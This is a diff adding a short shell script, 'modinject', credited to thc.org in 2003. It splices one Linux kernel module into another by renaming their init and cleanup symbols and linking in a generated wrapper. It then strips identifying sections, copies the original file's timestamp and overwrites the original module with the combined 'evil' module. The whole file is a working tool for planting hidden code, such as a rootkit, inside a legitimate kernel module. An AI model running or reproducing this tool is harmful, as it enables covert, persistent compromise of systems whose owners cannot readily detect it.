@@ -1,0 +1,68 @@
+#!/bin/sh 
+#
+# (C) 2003 by rd <rd@thc.org>
+#
+# Injects a linux kernel module into another one
+# Support for both 2.4 and 2.6 kernel module
+#
+# Usage: modinject orig_module inject_module
+#
+
+if [ $# -ne 2 ]; then
+	echo "usage: `basename $0` orig_module inject_module"
+	exit 1
+fi
+
+ORIG_MOD=`basename $1`.tmp
+INJECT_MOD=`basename $2`.tmp
+ORIG_MODNAME=`basename $ORIG_MOD|cut -f1 -d'.'`
+ORIG_MODEXT=`basename $ORIG_MOD|cut -f2 -d'.'`
+
+cp $1 tool/$ORIG_MOD || exit $?
+cp $2 tool/$INJECT_MOD || exit $?
+
+cd tool/
+make chelfsym || exit $?
+
+./chelfsym $ORIG_MOD init_module _nit_module || exit $?
+./chelfsym $ORIG_MOD cleanup_module _leanup_module || exit $?
+./chelfsym $INJECT_MOD init_module __it_module || exit $?
+./chelfsym $INJECT_MOD cleanup_module __eanup_module || exit $?
+
+cat >inject.c <<EOF
+#define KBUILD_BASENAME "$ORIG_MODNAME"
+#define KBUILD_MODNAME KBUILD_BASENAME
+#include "config.h"
+int init_module(void) 
+{
+	__init_parm();
+	if (__it_module()) return -1;
+	if (_nit_module())
+		__eanup_module();
+	return 0;
+}
+void cleanup_module(void)
+{
+	__eanup_module();
+	_leanup_module();
+}
+EOF
+
+make inject || exit $?
+
+strip --strip-debug --strip-unneeded -x -R ".rel.gnu.linkonce.this_module" -R ".modinfo" $INJECT_MOD
+if [ "$ORIG_MODEXT" == "ko" ]; then
+	strip -R ".modinfo" inject.o
+fi
+ld -r inject.o $ORIG_MOD $INJECT_MOD -o evil.$ORIG_MODEXT || exit $?
+
+# cleanup
+rm -f $ORIG_MOD $INJECT_MOD inject.*
+
+# overwrite original module
+chown root.root evil.$ORIG_MODEXT
+touch -r $1 evil.$ORIG_MODEXT
+cd ..
+mv -i tool/evil.$ORIG_MODEXT $1
+
+exit 0
